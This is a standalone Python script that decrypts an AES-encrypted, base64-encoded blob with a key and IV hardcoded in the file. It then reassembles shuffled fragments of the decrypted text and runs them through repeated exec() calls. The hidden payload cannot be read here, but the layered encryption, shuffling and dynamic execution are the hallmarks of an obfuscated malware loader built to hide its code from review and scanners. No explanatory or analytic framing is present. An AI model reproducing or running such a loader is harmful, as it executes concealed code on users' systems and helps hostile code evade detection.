
#!/usr/bin/python
import Crypto,base64
from Crypto.Cipher import AES
from base64 import b64decode, b64encode

def ddc(pld,key,iv):
    obj3 = AES.new(key,AES.MODE_CFB,iv)
    cd = obj3.decrypt(pld)

    return cd
def exddc(pld,key,iv):
    cP = pld
    out = b64decode(cP)
    x = ddc(out,key,iv)
    return x
def rcnLn(shfLn,arrMap):
    cmd=""
    
    
    for indice in arrMap:
        cmd = "{}{}".format(str(cmd),str(shfLn[indice]))
    

    return cmd
    
def rcnPld(shfPld):
    exec(shfPld)
    for key in shfPld:
        key = int(key)
        cmd = ""
        shfLn = shfPld[key][0]
        
         
        arrMap = shfPld[key][1] 
        cmd = rcnLn(shfLn,arrMap)
        exec(cmd)
        
    return

key="""XS4AFLNUGUJZ76F0A6V81TT3X0HMB133"""
iv="""udvriausnwz0uxv0"""

pld=str("""
IgowD1Yd0cNA5vaDJ4H5PE995uv909L3oldbUVJJ6RhWL+0NfB4/D9YjNFoHo9DNqcvLbQqdqwqRKN+VSoBw5Et8e9WhAoWh0bnaT2q7YM33JyITUDyrnGDv4iyy1gHrbUJS1lrrj/LaoKzR+aLdhUs23PJQI7AZnBD3X1+vcJolhLupx+aXB+UPQNE/B2TNStmb/zQ3ekrX3DIR6OC/2OMF9ZrIBIizXE/Hbfs3/mguee0hXs2Ujng9HEVYAeF4Vv43AdQYrh9vxnBd7mwKD7YlZXeLNeXHN++VliQkGJ5IMwwLdJX32zgM0ALXMb54ieQOGWYtq3zq49Boe3cbI5/SWZJtg0HjfkBAL9pE2kZ65PFDpxfvg0YLz8bVpwMIqEGv2Hso5bSSuangE5ZMUYblnfOsm1BkZR3kqSCnYAbKt8YZ/YxmzfW2JHpazHeM+nCCORhCUnoHF5vYQdx6nCLFuOVLU6hcM/nKxCyTT4XuXEvOXHqKO9uI3yfutfw4vQ6g6qFvdILhTcaJsKr/G2+6YagVyCGkGbKGspMEJH26QZNKMlJ91wahA6T+WkNhGpmdspUo9HBzLJEc5V+rYQQAZFt+qBdVB9zyzWFDbON9XNIDZNKwE1v3gz1gr77mLG1cQ8fK9/j4X7TA1lm72TPsHm6EMQmcNb3KCOV9+dxWRK8w6YX0GcPztIWz34HhmGWeoYftpsE9fbiNj9kVtDUbtb8OJ9oo0AwKzb6ePKXZnz9/qyRIYqtZl09g/abfOVPXZF7tcqhFD/4KuT+N8KQ9WmxgmO0v61B9CG1iqoHmsFXDk20H+Cg5oR5T7/zDm+ZdNgSBJ3z57/LGprZAPkZG9q5be4mwR0UwYN7pgq8sF9fk3+JeVcX8kqBs9EWcQh2Qj5Pw/HD3yuKsMxcYWT6Qnm2EIxFQArcqfCGHbNbvaJM0IhaZEwuyUkdDsJ4+B+Q0bP2OMYmJb1xoOQZGrodPS5mf+WhYgkbRrn50z2TsWAgitx0Jm6gjV14mhd45tO6SZ+AjMmeOcvanB14sC3r5QptCoLVORK5eRQ1rFw+0+QQxSxcyN4MuGb5rEP8z7+uyx67fqo0eNm/soS6+Grby1OM8e38knuo3V3Jqyl+oFGbsV84h793ekXzYA7oYqQ9ceqcbn8AH7PWE6oFTmjmnYl+InpabySAtyh45dR+LfYTX5RwknvvkYU+X6L8D88AL1XiF8AlOCS5tZMWXqlszn0ZTcSS7mGzOGEyEzSkaQdV3bFe8bDLB3Xl0CNfmHCJX5Kv92sn3/BsLSRyJOMuyvit29pLggqkqrxHDwtmMSi8gdtawqLiDRsfAboZzOmq9nOFW0WZzTS2inJ3zdhU=
""")
            

def mn(xc=pld):
    cd=xc
    sP = exddc(cd,key,iv)
    
    
    
    nS = "shfPld={}".format(str(sP))
    
    rcnPld(nS)
    return
mn()